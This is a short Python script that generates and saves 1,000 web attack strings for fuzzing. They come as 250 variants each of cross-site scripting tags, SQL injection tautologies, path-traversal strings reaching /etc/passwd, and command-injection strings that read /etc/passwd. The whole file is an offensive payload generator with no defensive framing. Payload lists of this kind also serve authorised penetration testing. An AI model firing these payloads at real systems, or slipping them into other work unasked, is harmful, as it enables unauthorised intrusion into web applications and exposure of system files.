# generate_payloads.py

def generate_xss_payloads():
    return [f"<script>alert('XSS {i}')</script>" for i in range(1, 251)]

def generate_sqli_payloads():
    return [f"' OR {i}={i} --" for i in range(1, 251)]

def generate_lfi_payloads():
    return [f"../../{'../'*i}etc/passwd" for i in range(1, 251)]

def generate_rce_payloads():
    return [f"; cat /etc/passwd #{i}" for i in range(1, 251)]

def generate_all_payloads():
    xss = generate_xss_payloads()
    sqli = generate_sqli_payloads()
    lfi = generate_lfi_payloads()
    rce = generate_rce_payloads()
    all_payloads = xss + sqli + lfi + rce
    return all_payloads

def save_payloads(payloads):
    with open("payloads.txt", "w") as f:
        for payload in payloads:
            f.write(payload + "\n")
    print("Payloads generated and saved.")

if __name__ == "__main__":
    payloads = generate_all_payloads()
    save_payloads(payloads)
